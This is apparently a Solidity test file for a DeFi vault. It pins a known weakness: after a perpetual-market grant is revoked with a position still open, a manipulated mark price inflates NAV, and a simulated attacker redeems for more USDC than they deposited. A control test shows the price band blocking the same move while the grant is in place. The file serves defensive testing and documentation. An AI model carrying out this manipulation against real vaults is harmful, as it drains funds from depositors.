// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import {HyperCoreEffectSettlementBase} from "./HyperCoreEffectSettlementBase.sol";
import {FuseAction} from "../../../contracts/interfaces/IPlasmaVault.sol";
import {PlasmaVaultGovernance} from "../../../contracts/vaults/PlasmaVaultGovernance.sol";
import {Roles} from "../../../contracts/libraries/Roles.sol";
import {
    HyperCoreDepositFuse,
    HyperCoreDepositFuseEnterData
} from "../../../contracts/fuses/hypercore/HyperCoreDepositFuse.sol";
import {
    HyperCoreMarginFuse,
    HyperCoreMarginFuseEnterData
} from "../../../contracts/fuses/hypercore/HyperCoreMarginFuse.sol";
import {
    HyperCoreOrderFuse,
    HyperCoreOrderFuseEnterData
} from "../../../contracts/fuses/hypercore/HyperCoreOrderFuse.sol";
import {HyperCoreLib} from "../../../contracts/fuses/hypercore/lib/HyperCoreLib.sol";
import {HyperCoreSubstrateLib} from "../../../contracts/fuses/hypercore/lib/HyperCoreSubstrateLib.sol";
import {HyperCoreValuationLib} from "../../../contracts/fuses/hypercore/lib/HyperCoreValuationLib.sol";
import {NavJumpFloorFixture} from "./HyperCoreNavJumpFloorFixture.sol";
import {CoreSimulatorLib} from "./simulation/CoreSimulatorLib.sol";

/// @title IL-9690 pinning test: HyperCore mark-oracle band and a revoked PerpMarket grant
/// @notice Pins today's behaviour, accepted by IL-9566 D-002 (fuses do not police grant/revoke consequences):
///         the mark-vs-oracle band enumerates only granted `PerpMarket` substrates, while NAV prices the whole
///         native-dex account equity. After the grant of a market with an open position is revoked, the band no longer
///         covers that market, its mark still enters NAV, and a flow priced on it is not blocked. The operational rule
///         is: close the position first, then revoke the grant.
///         The control test shows the same mark move reverts while the grant is in place. A change of this behaviour
///         must update this test and the HyperCore README "Grant changes" section.
contract HyperCoreMarkBandRevokedGrantPinTest is HyperCoreEffectSettlementBase {
    uint256 internal constant ATTACK = 500_000e6;

    address internal _attacker = makeAddr("ATTACKER");

    function setUp() public override {
        super.setUp();
        vm.prank(_atomist);
        _accessManager.grantRole(Roles.WHITELIST_ROLE, _attacker, 0);
        _usdc.mint(_attacker, ATTACK);
        vm.prank(_attacker);
        _usdc.approve(address(_vault), ATTACK);
    }

    // ------------------------------------------------------------------
    // revoke the grant, move the now-unvalidated mark, profit
    // ------------------------------------------------------------------
    function testRevokedPerpMarketGrantLeavesMarkOutsideBand() public {
        // Vault holds a 1000 HYPE long on the native dex; mark == oracle == $40, fair NAV.
        _openLong(1000e8);

        // Attacker enters at the fair price (mark == oracle), before any manipulation.
        vm.prank(_attacker);
        uint256 shares = _vault.deposit(ATTACK, _attacker);
        uint256 navFair = _vault.totalAssets();

        // --- Governance revokes the HYPE `PerpMarket` grant while the long is still open. ---
        // The order fuse needed the grant to OPEN; nothing needs it to HOLD. accountMarginSummary(0)
        // still includes the position, but the band will no longer enumerate HYPE.
        _regrantWithoutPerpMarket();
        assertGt(HyperCoreLib.position(address(_vault), HYPE_PERP).szi, 0, "position still open after revoke");

        // --- Anyone able to move the ungranted market's mark pushes it +20%; the oracle stays pinned. ---
        CoreSimulatorLib.setMarkPx(HYPE_PERP, 480_000); // +20%, 4x beyond the 5% (500 bps) band

        // (1) The fake mark enters NAV: an ordinary refresh books it; the NAV-jump breaker (50%) does not stop it.
        uint256 navManip = _refreshAndTotalAssets();
        assertGt(navManip, navFair, "ungranted market's fake mark inflated NAV");

        // (2) The band does NOT block a user redeem: HYPE is no longer enumerated by _checkMarkOracleBand.
        vm.prank(_attacker);
        uint256 got = _vault.redeem(shares, _attacker, _attacker);

        // (3) The attacker extracts MORE USDC than they deposited: share price moved in their favour.
        assertGt(got, ATTACK, "attacker profits from the unvalidated mark of the revoked market");
    }

    // ------------------------------------------------------------------
    // Control: with the grant in place, the SAME move trips the band
    // ------------------------------------------------------------------
    function testGrantedPerpMarketTripsBandOnSameMarkMove() public {
        _openLong(1000e8);

        vm.prank(_attacker);
        uint256 shares = _vault.deposit(ATTACK, _attacker);

        // HYPE `PerpMarket` grant is STILL in place (fixture default). Same +20% mark move.
        CoreSimulatorLib.setMarkPx(HYPE_PERP, 480_000);

        // The band enumerates HYPE, sees mark 480_000 vs oracle 400_000 (+20% > 5%), and reverts the flow.
        vm.prank(_attacker);
        vm.expectRevert(_deviationError(HYPE_PERP, 480_000, 400_000));
        _vault.redeem(shares, _attacker, _attacker);

        // Deposit is blocked too.
        vm.prank(_attacker);
        vm.expectRevert(_deviationError(HYPE_PERP, 480_000, 400_000));
        _vault.deposit(1e6, _attacker);
    }

    // ------------------------------------------------------------------
    // helpers (copied from the IL-8534 band fixture to keep this PoC self-contained)
    // ------------------------------------------------------------------

    /// @dev Re-grant the HYPERCORE substrates WITHOUT the HYPE `PerpMarket` entry (keeps the USDC SpotToken,
    ///      which _perpValueWad needs to price perp equity, plus the usual config). This is the precondition:
    ///      the `PerpMarket` grant is revoked while the position is non-flat.
    function _regrantWithoutPerpMarket() internal {
        bytes32[] memory subs = new bytes32[](7);
        subs[0] = HyperCoreSubstrateLib.encodeSpotToken(USDC_TOKEN, address(_usdc));
        subs[1] = HyperCoreSubstrateLib.encodeDestination(HyperCoreLib.systemAddress(USDC_TOKEN));
        subs[2] = HyperCoreSubstrateLib.encodeDestination(address(_vault));
        subs[3] = HyperCoreSubstrateLib.encodeBuilder(_builder, 100);
        subs[4] = HyperCoreSubstrateLib.encodeSendCap(USDC_TOKEN, type(uint128).max);
        subs[5] = HyperCoreSubstrateLib.encodeConfig(HyperCoreSubstrateLib.ConfigKey.WindowTransferSeconds, 2);
        subs[6] = HyperCoreSubstrateLib.encodeConfig(
            HyperCoreSubstrateLib.ConfigKey.MaxUsdClassTransferUsd6,
            1_000_000e6
        );
        // deliberately NO encodePerpMarket(HYPE_PERP, ...) -> band enumerates no perp market for this account
        vm.prank(_fuseManager);
        PlasmaVaultGovernance(address(_vault)).grantMarketSubstrates(MARKET_ID, NavJumpFloorFixture.withFloor(subs));
    }

    function _deviationError(uint32 asset_, uint64 mark_, uint64 oracle_) internal pure returns (bytes memory) {
        return
            abi.encodeWithSelector(HyperCoreValuationLib.HyperCoreMarkOracleDeviation.selector, asset_, mark_, oracle_);
    }

    /// @dev Funds Core (spot then perp margin) so the account is active; pins mark == oracle == $40, leverage 1.
    function _activateAndFundPerp() internal {
        _execute(
            address(_depositFuse),
            abi.encodeWithSelector(
                HyperCoreDepositFuse.enter.selector,
                HyperCoreDepositFuseEnterData({tokenIndex: USDC_TOKEN, amount: 100_000e6})
            )
        );
        _settle(2);
        _refreshAndTotalAssets();
        _execute(
            address(_marginFuse),
            abi.encodeWithSelector(
                HyperCoreMarginFuse.enter.selector,
                HyperCoreMarginFuseEnterData({usd6: 50_000e6, toPerp: true})
            )
        );
        _settle(2);
        _refreshAndTotalAssets();
        CoreSimulatorLib.forcePerpLeverage(address(_vault), HYPE_PERP, 1);
        CoreSimulatorLib.setMarkPx(HYPE_PERP, 400_000); // $40
        CoreSimulatorLib.setOraclePx(HYPE_PERP, 400_000); // pinned: oracle no longer follows the mark
    }

    /// @dev Opens a long of `sz1e8_` HYPE at ~$40 (TIMING) and settles it.
    function _openLong(uint64 sz1e8_) internal {
        _activateAndFundPerp();
        _executeOrder(true, 45e8, sz1e8_, false, HyperCoreLib.TIF_IOC, CLOID_1);
        _settle(10);
        assertGt(HyperCoreLib.position(address(_vault), HYPE_PERP).szi, 0, "long opened");
        _refreshAndTotalAssets();
    }

    function _execute(address fuse_, bytes memory data_) internal {
        FuseAction[] memory actions = new FuseAction[](1);
        actions[0] = FuseAction(fuse_, data_);
        _vault.execute(actions);
    }

    function _executeOrder(
        bool isBuy_,
        uint64 limitPx_,
        uint64 sz_,
        bool reduceOnly_,
        uint8 tif_,
        uint128 cloid_
    ) internal {
        _execute(
            address(_orderFuse),
            abi.encodeWithSelector(
                HyperCoreOrderFuse.enter.selector,
                HyperCoreOrderFuseEnterData({
                    asset: HYPE_PERP,
                    isBuy: isBuy_,
                    limitPx: limitPx_,
                    sz: sz_,
                    reduceOnly: reduceOnly_,
                    tif: tif_,
                    cloid: cloid_
                })
            )
        );
    }
}
